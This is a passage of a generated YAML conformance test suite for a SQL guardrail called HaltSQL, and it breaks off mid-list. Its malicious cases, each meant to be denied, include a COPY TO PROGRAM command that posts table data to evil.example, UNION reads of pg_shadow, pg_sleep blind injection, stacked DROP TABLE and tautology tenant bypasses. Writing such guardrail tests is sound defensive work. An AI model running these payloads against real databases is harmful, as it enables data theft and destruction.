@@ -1,0 +1,1315 @@
+# ---------------------------------------------------------------------------
+# Conformance cases ported from sql-guardrail
+#   Source:  https://github.com/nickusevich/sql-guardrail
+#   Commit:  eadfb9d0c725f4960621a7c67c23219103710c5b
+#   License: MIT -- Copyright (c) 2026 nickusevich
+#            (Permission is hereby granted, free of charge, to any person
+#             obtaining a copy of this software ... The above copyright notice
+#             and this permission notice shall be included in all copies or
+#             substantial portions of the Software.)
+# The SQL strings below are taken from that project's tests (tests/malicious,
+# tests/benign, tests/test_corpus.py, tests/test_security.py, tests/unit/*);
+# each case's `sqlg:<file>::<test>` tag names the original test. Expected
+# verdicts follow HALTSQL semantics (PLAN.md section 6). Cases tagged `differs`
+# have a different outcome from sql-guardrail, `differs-code` the same outcome
+# for a different reason; cases tagged `sqlg-adapted` change the SQL slightly
+# (noted in the case name); cases tagged `ambiguous` exercise behaviour
+# HaltSQL's spec leaves open. See README.md.
+# GENERATED from the ported data; regenerate rather than hand-editing.
+# ---------------------------------------------------------------------------
+apiVersion: haltsql.dev/v1
+kind: TestSuite
+metadata:
+  name: sqlg-standard
+  description: "sql-guardrail corpus and security regression tests under standard_policy"
+policy: policies/sqlg_standard.yaml
+defaults:
+  context: {"tenant_id":"42"}
+cases:
+  - name: "malicious alter_system.sql"
+    sql: "ALTER SYSTEM SET log_statement = 'all';\n"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/malicious/alter_system.sql"]
+  - name: "malicious always_true.sql"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR 1 = 1;\n"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/malicious/always_true.sql"]
+  - name: "malicious call_procedure.sql"
+    sql: "CALL admin_reset_passwords();\n"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/malicious/call_procedure.sql"]
+  - name: "malicious coalesce_null_tenants.sql"
+    sql: "SELECT id, total FROM orders WHERE COALESCE(account_id, 42) = 42 LIMIT 10;\n"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/malicious/coalesce_null_tenants.sql"]
+  - name: "malicious copy_from_program.sql"
+    sql: "COPY orders TO PROGRAM 'curl -X POST http://evil.example/leak --data-binary @-';\n"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/malicious/copy_from_program.sql"]
+  - name: "malicious create_policy_disable_rls.sql"
+    sql: "CREATE POLICY pol ON orders FOR SELECT USING (true);\n"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/malicious/create_policy_disable_rls.sql"]
+  - name: "malicious create_rule_rewrite_select.sql"
+    sql: "CREATE RULE r AS ON SELECT TO orders DO INSTEAD SELECT 1;\n"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/malicious/create_rule_rewrite_select.sql"]
+  - name: "malicious cross_join_cartesian.sql"
+    sql: "SELECT o2.id, o2.total\nFROM orders o1\nCROSS JOIN orders o2\nWHERE o1.account_id = 42 AND o2.account_id = 42;\n"
+    expect: deny
+    codes: [E_LIMIT_REQUIRED]
+    tags: ["conformance", "sqlg:tests/malicious/cross_join_cartesian.sql", "differs-code"]
+  - name: "malicious data_modifying_cte.sql"
+    sql: "WITH d AS (DELETE FROM orders RETURNING id) SELECT id FROM d;\n"
+    expect: deny
+    codes: [E_DATA_MODIFYING_CTE]
+    tags: ["conformance", "sqlg:tests/malicious/data_modifying_cte.sql"]
+  - name: "malicious denied_column.sql"
+    sql: "SELECT id, password_hash FROM users WHERE id = 5;\n"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/malicious/denied_column.sql"]
+  - name: "malicious dml_delete_missing_tenant.sql"
+    sql: "DELETE FROM orders WHERE id = 1;\n"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/malicious/dml_delete_missing_tenant.sql"]
+  - name: "malicious dml_insert_deny_column.sql"
+    sql: "INSERT INTO users(password_hash) VALUES ('x');\n"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/malicious/dml_insert_deny_column.sql"]
+  - name: "malicious do_block.sql"
+    sql: "DO $$ BEGIN EXECUTE 'DROP TABLE orders'; END $$;\n"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/malicious/do_block.sql"]
+  - name: "malicious empty_input.sql"
+    sql: ""
+    expect: deny
+    codes: [E_EMPTY]
+    tags: ["conformance", "sqlg:tests/malicious/empty_input.sql", "differs-code"]
+  - name: "malicious explain_analyze.sql"
+    sql: "EXPLAIN ANALYZE SELECT * FROM orders;\n"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/malicious/explain_analyze.sql"]
+  - name: "malicious for_update.sql"
+    sql: "SELECT id FROM orders WHERE account_id = 42 FOR UPDATE;\n"
+    expect: deny
+    codes: [E_LOCKING_CLAUSE]
+    tags: ["conformance", "sqlg:tests/malicious/for_update.sql"]
+  - name: "malicious having_max_denied_column.sql"
+    sql: "SELECT 1 FROM users HAVING max(password_hash) IS NOT NULL;\n"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/malicious/having_max_denied_column.sql"]
+  - name: "malicious having_password_exfil.sql"
+    sql: "SELECT id FROM users\nGROUP BY id\nHAVING bool_or(substr(password_hash, 1, 1) = 'a');\n"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/malicious/having_password_exfil.sql"]
+  - name: "malicious limit_all_bypass.sql"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 LIMIT ALL;\n"
+    expect: deny
+    tags: ["conformance", "sqlg:tests/malicious/limit_all_bypass.sql", "ambiguous"]
+  - name: "malicious listen_notify.sql"
+    sql: "LISTEN evil_channel;\n"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/malicious/listen_notify.sql"]
+  - name: "malicious missing_tenant.sql"
+    sql: "SELECT id, total FROM orders WHERE total > 1000;\n"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/malicious/missing_tenant.sql"]
+  - name: "malicious multi_statement.sql"
+    sql: "SELECT 1; DROP TABLE users;\n"
+    expect: deny
+    codes: [E_MULTI_STATEMENT]
+    tags: ["conformance", "sqlg:tests/malicious/multi_statement.sql"]
+  - name: "malicious natural_join.sql"
+    sql: "SELECT u.id, u.name FROM users u NATURAL JOIN orders WHERE u.id = 1;\n"
+    expect: deny
+    tags: ["conformance", "sqlg:tests/malicious/natural_join.sql", "differs-code", "ambiguous"]
+  - name: "malicious offset_dos.sql (allowed by HaltSQL)"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 LIMIT 10 OFFSET 99999999;\n"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/malicious/offset_dos.sql", "differs"]
+  - name: "malicious offset_setop_bypass.sql"
+    sql: "SELECT id FROM orders WHERE account_id = 42\nUNION\nSELECT id FROM orders WHERE account_id = 42\nOFFSET 999999999\n"
+    expect: deny
+    codes: [E_LIMIT_REQUIRED]
+    tags: ["conformance", "sqlg:tests/malicious/offset_setop_bypass.sql", "differs-code"]
+  - name: "malicious pg_hba_file_rules.sql"
+    sql: "SELECT type, database, user_name, address, auth_method FROM pg_hba_file_rules;\n"
+    expect: deny
+    codes: [E_TABLE_DENIED]
+    tags: ["conformance", "sqlg:tests/malicious/pg_hba_file_rules.sql"]
+  - name: "malicious pg_sleep_blind.sql"
+    sql: "SELECT id FROM users WHERE id = 1 AND pg_sleep(10) IS NOT NULL;\n"
+    expect: deny
+    codes: [E_FUNCTION_DENIED]
+    tags: ["conformance", "sqlg:tests/malicious/pg_sleep_blind.sql"]
+  - name: "malicious qualified_wildcard_to_jsonb.sql"
+    sql: "SELECT to_jsonb(users.*) FROM users WHERE id = 1 LIMIT 10;\n"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/malicious/qualified_wildcard_to_jsonb.sql"]
+  - name: "malicious quoted_different_table.sql"
+    sql: "SELECT id, total FROM \"Orders\" WHERE account_id = 42 LIMIT 10;\n"
+    expect: deny
+    codes: [E_TABLE_DENIED]
+    tags: ["conformance", "sqlg:tests/malicious/quoted_different_table.sql"]
+  - name: "malicious recursive_cte_dos.sql"
+    sql: "WITH RECURSIVE r AS (\n    SELECT 1 AS n\n    UNION ALL\n    SELECT n + 1 FROM r\n)\nSELECT n FROM r;\n"
+    expect: deny
+    tags: ["conformance", "sqlg:tests/malicious/recursive_cte_dos.sql", "differs-code", "ambiguous"]
+  - name: "malicious select_into.sql"
+    sql: "SELECT id INTO orders_copy FROM orders WHERE account_id = 42 LIMIT 100;\n"
+    expect: deny
+    codes: [E_SELECT_INTO]
+    tags: ["conformance", "sqlg:tests/malicious/select_into.sql"]
+  - name: "malicious select_star.sql"
+    sql: "SELECT * FROM orders WHERE account_id = 42;\n"
+    expect: deny
+    codes: [E_COLUMN_DENIED]
+    tags: ["conformance", "sqlg:tests/malicious/select_star.sql"]
+  - name: "malicious self_join_bypass.sql"
+    sql: "SELECT o2.id, o2.total\nFROM orders o1\nJOIN orders o2 ON 1=1\nWHERE o1.account_id = 42;\n"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/malicious/self_join_bypass.sql"]
+  - name: "malicious set_search_path.sql"
+    sql: "SET search_path = 'attacker_schema, public';\n"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/malicious/set_search_path.sql"]
+  - name: "malicious sibling_subquery_limit_bypass.sql"
+    sql: "SELECT id, total FROM orders\nWHERE account_id = 42\n  AND id < (SELECT count(*) FROM users LIMIT 1);\n"
+    expect: deny
+    codes: [E_LIMIT_REQUIRED]
+    tags: ["conformance", "sqlg:tests/malicious/sibling_subquery_limit_bypass.sql"]
+  - name: "malicious table_shorthand_pg_shadow.sql"
+    sql: "TABLE pg_shadow;\n"
+    expect: deny
+    codes: [E_TABLE_DENIED]
+    tags: ["conformance", "sqlg:tests/malicious/table_shorthand_pg_shadow.sql"]
+  - name: "malicious tautology_arithmetic.sql (allowed by HaltSQL)"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (1 + 1 = 2) LIMIT 10;\n"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/malicious/tautology_arithmetic.sql", "differs"]
+  - name: "malicious tautology_between.sql (allowed by HaltSQL)"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (5 BETWEEN 1 AND 10) LIMIT 10;\n"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/malicious/tautology_between.sql", "differs"]
+  - name: "malicious tautology_case.sql (allowed by HaltSQL)"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (CASE WHEN 0 = 1 THEN false ELSE true END) LIMIT 10;\n"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/malicious/tautology_case.sql", "differs"]
+  - name: "malicious tautology_cast_bool.sql (allowed by HaltSQL)"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR true::boolean LIMIT 10;\n"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/malicious/tautology_cast_bool.sql", "differs"]
+  - name: "malicious tautology_column_self_eq.sql (allowed by HaltSQL)"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR id = id LIMIT 10;\n"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/malicious/tautology_column_self_eq.sql", "differs"]
+  - name: "malicious tautology_exists_constant.sql (allowed by HaltSQL)"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR EXISTS (SELECT 1) LIMIT 10;\n"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/malicious/tautology_exists_constant.sql", "differs"]
+  - name: "malicious tautology_or_lt.sql (allowed by HaltSQL)"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR 1 < 2 LIMIT 10;\n"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/malicious/tautology_or_lt.sql", "differs"]
+  - name: "malicious union_pg_shadow.sql"
+    sql: "SELECT id, name FROM users WHERE id = 1\nUNION\nSELECT usename, passwd FROM pg_shadow;\n"
+    expect: deny
+    codes: [E_TABLE_DENIED]
+    tags: ["conformance", "sqlg:tests/malicious/union_pg_shadow.sql"]
+  - name: "malicious write_disguised_as_select.sql"
+    sql: "UPDATE orders SET total = 0 WHERE account_id = 42;\n"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/malicious/write_disguised_as_select.sql"]
+  - name: "malicious wrong_tenant.sql"
+    sql: "SELECT id, total FROM orders WHERE account_id = 99;\n"
+    expect: deny
+    codes: [E_TENANT_MISMATCH]
+    tags: ["conformance", "sqlg:tests/malicious/wrong_tenant.sql"]
+  - name: "benign cte_aggregation.sql"
+    sql: "WITH recent_orders AS (\n    SELECT id, total, created_at\n    FROM orders\n    WHERE account_id = 42 AND created_at > '2026-01-01'\n    LIMIT 1000\n)\nSELECT id, total FROM recent_orders;\n"
+    expect: deny
+    codes: [E_LIMIT_REQUIRED]
+    tags: ["conformance", "sqlg:tests/benign/cte_aggregation.sql", "differs"]
+  - name: "benign except_simple.sql"
+    sql: "(SELECT id, total FROM orders WHERE account_id = 42 LIMIT 10)\nEXCEPT\n(SELECT id, total FROM orders WHERE account_id = 42 AND total > 1000 LIMIT 10);\n"
+    expect: deny
+    codes: [E_LIMIT_REQUIRED]
+    tags: ["conformance", "sqlg:tests/benign/except_simple.sql", "ambiguous"]
+  - name: "benign fetch_first_rows_only.sql"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 FETCH FIRST 10 ROWS ONLY;\n"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/benign/fetch_first_rows_only.sql"]
+  - name: "benign group_by.sql"
+    sql: "SELECT product_name, SUM(total) AS revenue\nFROM orders\nWHERE account_id = 42\nGROUP BY product_name\nORDER BY revenue DESC\nLIMIT 10;\n"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/benign/group_by.sql"]
+  - name: "benign having_legit.sql"
+    sql: "SELECT account_id, count(*)\nFROM orders\nWHERE account_id = 42\nGROUP BY account_id\nHAVING count(*) > 5\nLIMIT 10;\n"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/benign/having_legit.sql"]
+  - name: "benign intersect_simple.sql"
+    sql: "(SELECT id, total FROM orders WHERE account_id = 42 LIMIT 10)\nINTERSECT\n(SELECT id, total FROM orders WHERE account_id = 42 AND total > 100 LIMIT 10);\n"
+    expect: deny
+    codes: [E_LIMIT_REQUIRED]
+    tags: ["conformance", "sqlg:tests/benign/intersect_simple.sql", "ambiguous"]
+  - name: "benign join_with_tenant.sql"
+    sql: "SELECT u.id, u.name, o.total\nFROM users u\nJOIN orders o ON o.account_id = u.id\nWHERE o.account_id = 42 AND u.id = 5\nLIMIT 50;\n"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/benign/join_with_tenant.sql"]
+  - name: "benign simple_select.sql"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 LIMIT 100;\n"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/benign/simple_select.sql"]
+  - name: "benign union_simple.sql"
+    sql: "SELECT id, name FROM users WHERE id = 5\nUNION\nSELECT id, name FROM users WHERE id = 6;\n"
+    expect: deny
+    codes: [E_LIMIT_REQUIRED]
+    tags: ["conformance", "sqlg:tests/benign/union_simple.sql", "differs"]
+  - name: "benign window_function.sql"
+    sql: "SELECT\n    id,\n    total,\n    ROW_NUMBER() OVER (PARTITION BY product_name ORDER BY created_at DESC) AS rn\nFROM orders\nWHERE account_id = 42\nLIMIT 100;\n"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/benign/window_function.sql"]
+  - name: "README policy accepts multi_clause_where_and"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 AND total > 0 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_corpus.py::test_readme_example_policy_accepts_realistic_sql[multi_clause_where_and]"]
+  - name: "README policy accepts multi_clause_where_or"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 AND (total > 100 OR total < 10) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_corpus.py::test_readme_example_policy_accepts_realistic_sql[multi_clause_where_or]"]
+  - name: "README policy accepts case_expression"
+    sql: "SELECT id, CASE WHEN total > 100 THEN 'big' ELSE 'small' END FROM orders WHERE account_id = 42 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_corpus.py::test_readme_example_policy_accepts_realistic_sql[case_expression]"]
+  - name: "README policy accepts case_multi_arm"
+    sql: "SELECT id, CASE WHEN total > 1000 THEN 'huge' WHEN total > 100 THEN 'big' ELSE 'small' END FROM orders WHERE account_id = 42 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_corpus.py::test_readme_example_policy_accepts_realistic_sql[case_multi_arm]"]
+  - name: "README policy accepts exists_subquery"
+    sql: "SELECT id, total FROM orders o WHERE o.account_id = 42 AND EXISTS (SELECT 1 FROM users u WHERE u.id = 1) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_corpus.py::test_readme_example_policy_accepts_realistic_sql[exists_subquery]"]
+  - name: "README policy accepts aggregate_with_having"
+    sql: "SELECT account_id, count(id) FROM orders WHERE account_id = 42 GROUP BY account_id HAVING count(id) > 5 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_corpus.py::test_readme_example_policy_accepts_realistic_sql[aggregate_with_having]"]
+  - name: "README policy accepts coalesce_and_cast"
+    sql: "SELECT id, coalesce(cast(total AS text), '0') FROM orders WHERE account_id = 42 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_corpus.py::test_readme_example_policy_accepts_realistic_sql[coalesce_and_cast]"]
+  - name: "README policy accepts extract_from_timestamp"
+    sql: "SELECT extract(year FROM created_at), count(id) FROM orders WHERE account_id = 42 GROUP BY extract(year FROM created_at) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_corpus.py::test_readme_example_policy_accepts_realistic_sql[extract_from_timestamp]", "ambiguous"]
+  - name: "non-select statement: CREATE POLICY pol ON orders FOR SELECT U"
+    sql: "CREATE POLICY pol ON orders FOR SELECT USING (true)"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
+  - name: "non-select statement: ALTER SYSTEM SET log_statement='all'"
+    sql: "ALTER SYSTEM SET log_statement='all'"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
+  - name: "non-select statement: COMMENT ON TABLE orders IS 'pwned'"
+    sql: "COMMENT ON TABLE orders IS 'pwned'"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
+  - name: "non-select statement: CREATE RULE r AS ON SELECT TO orders DO "
+    sql: "CREATE RULE r AS ON SELECT TO orders DO INSTEAD SELECT 1"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
+  - name: "non-select statement: CREATE EVENT TRIGGER t ON ddl_command_st"
+    sql: "CREATE EVENT TRIGGER t ON ddl_command_start EXECUTE FUNCTION f()"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
+  - name: "non-select statement: CREATE PUBLICATION p FOR TABLE orders"
+    sql: "CREATE PUBLICATION p FOR TABLE orders"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
+  - name: "non-select statement: CREATE INDEX idx ON orders (id)"
+    sql: "CREATE INDEX idx ON orders (id)"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
+  - name: "non-select statement: DROP TABLE orders"
+    sql: "DROP TABLE orders"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
+  - name: "non-select statement: CREATE EXTENSION pg_stat_statements"
+    sql: "CREATE EXTENSION pg_stat_statements"
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestStatementKinds::test_non_select_statements_blocked"]
+  - name: "multi statement SELECT 1; DROP TABLE orders;"
+    sql: "SELECT 1; DROP TABLE orders;"
+    expect: deny
+    codes: [E_MULTI_STATEMENT]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_multi_statement_forbidden"]
+  - name: "data-modifying CTE DELETE"
+    sql: "WITH x AS (DELETE FROM orders RETURNING id) SELECT id FROM x"
+    expect: deny
+    codes: [E_DATA_MODIFYING_CTE]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_data_modifying_cte_forbidden"]
+  - name: "lock FOR UPDATE"
+    sql: "SELECT id FROM orders WHERE account_id = 42 FOR UPDATE"
+    expect: deny
+    codes: [E_LOCKING_CLAUSE]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_locks_forbidden"]
+  - name: "lock FOR SHARE"
+    sql: "SELECT id FROM orders WHERE account_id = 42 FOR SHARE"
+    expect: deny
+    codes: [E_LOCKING_CLAUSE]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_locks_forbidden"]
+  - name: "lock FOR UPDATE NOWAIT"
+    sql: "SELECT id FROM orders WHERE account_id = 42 FOR UPDATE NOWAIT"
+    expect: deny
+    codes: [E_LOCKING_CLAUSE]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_locks_forbidden"]
+  - name: "select into: INTO orders_copy FROM orders W"
+    sql: "SELECT id INTO orders_copy FROM orders WHERE account_id = 42 LIMIT 10"
+    expect: deny
+    codes: [E_SELECT_INTO]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_select_into_forbidden"]
+  - name: "select into: INTO TEMP tmp FROM orders WHER"
+    sql: "SELECT id INTO TEMP tmp FROM orders WHERE account_id = 42 LIMIT 10"
+    expect: deny
+    codes: [E_SELECT_INTO]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_select_into_forbidden"]
+  - name: "select into: INTO TEMPORARY tmp FROM orders"
+    sql: "SELECT id INTO TEMPORARY tmp FROM orders WHERE account_id = 42 LIMIT 10"
+    expect: deny
+    codes: [E_SELECT_INTO]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_select_into_forbidden"]
+  - name: "select into: INTO UNLOGGED tmp FROM orders "
+    sql: "SELECT id INTO UNLOGGED tmp FROM orders WHERE account_id = 42 LIMIT 10"
+    expect: deny
+    codes: [E_SELECT_INTO]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_select_into_forbidden"]
+  - name: "select into: INTO public.orders_copy FROM o"
+    sql: "SELECT id INTO public.orders_copy FROM orders WHERE account_id = 42 LIMIT 10"
+    expect: deny
+    codes: [E_SELECT_INTO]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_select_into_forbidden"]
+  - name: "select into allowlisted target orders_copy"
+    sql: "SELECT id INTO orders_copy FROM orders WHERE account_id = 42 LIMIT 10"
+    expect: deny
+    codes: [E_SELECT_INTO]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_select_into_blocked_even_with_target_allowlisted"]
+  - name: "parenthesized select 0"
+    sql: "(SELECT id FROM orders WHERE account_id = 42 LIMIT 1)"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_parenthesized_select_allowed"]
+  - name: "parenthesized select 1"
+    sql: "((SELECT id FROM orders WHERE account_id = 42 LIMIT 1))"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestCategoricalBans::test_parenthesized_select_allowed"]
+  - name: "common function: count(id) FROM orders "
+    sql: "SELECT count(id) FROM orders WHERE account_id = 42 LIMIT 1"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestFunctionAllowlist::test_common_functions_still_allowed"]
+  - name: "common function: coalesce(product_name,"
+    sql: "SELECT coalesce(product_name, 'x') FROM orders WHERE account_id = 42 LIMIT 1"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestFunctionAllowlist::test_common_functions_still_allowed"]
+  - name: "common function: upper(name) FROM users"
+    sql: "SELECT upper(name) FROM users WHERE id = 1 LIMIT 1"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestFunctionAllowlist::test_common_functions_still_allowed"]
+  - name: "common function: extract(year FROM created_at)"
+    sql: "SELECT extract(year FROM created_at) FROM orders WHERE account_id = 42 LIMIT 1"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestFunctionAllowlist::test_common_functions_still_allowed", "ambiguous"]
+  - name: "unknown function denied without explicit allowlist"
+    sql: "SELECT some_unknown_fn(id) FROM users LIMIT 1"
+    expect: deny
+    codes: [E_FUNCTION_DENIED]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestFunctionAllowlist::test_allowlist_unset_allows_unknown_function", "differs"]
+  - name: "multi statement: SELECT 1; SELECT 2"
+    sql: "SELECT 1; SELECT 2"
+    expect: deny
+    codes: [E_MULTI_STATEMENT]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestMultiStatementEnforcement::test_multi_statement_always_denied"]
+  - name: "multi statement: SELECT id FROM users; SELECT id FROM orders"
+    sql: "SELECT id FROM users; SELECT id FROM orders"
+    expect: deny
+    codes: [E_MULTI_STATEMENT]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestMultiStatementEnforcement::test_multi_statement_always_denied"]
+  - name: "multi statement: SELECT id FROM users; DROP TABLE users"
+    sql: "SELECT id FROM users; DROP TABLE users"
+    expect: deny
+    codes: [E_MULTI_STATEMENT]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestMultiStatementEnforcement::test_multi_statement_always_denied"]
+  - name: "multi statement: SELECT id FROM users; COPY users TO '/tmp/x.csv'"
+    sql: "SELECT id FROM users; COPY users TO '/tmp/x.csv'"
+    expect: deny
+    codes: [E_MULTI_STATEMENT]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestMultiStatementEnforcement::test_multi_statement_always_denied"]
+  - name: "multi statement: SELECT id FROM users; LISTEN evil_channel"
+    sql: "SELECT id FROM users; LISTEN evil_channel"
+    expect: deny
+    codes: [E_MULTI_STATEMENT]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestMultiStatementEnforcement::test_multi_statement_always_denied"]
+  - name: "tautology on global table allowed: 1 = 1"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (1 = 1) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[1 = 1]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: 1 = 1"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (1 = 1) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[1 = 1]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: true"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (true) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[true]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: true"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (true) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[true]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: 'true'::boolean"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR ('true'::boolean) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected['true'::boolean]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: 'true'::boolean"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR ('true'::boolean) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected['true'::boolean]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: 1 + 1 = 2"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (1 + 1 = 2) LIMIT 10"
+    expect: allow
+    bind: []
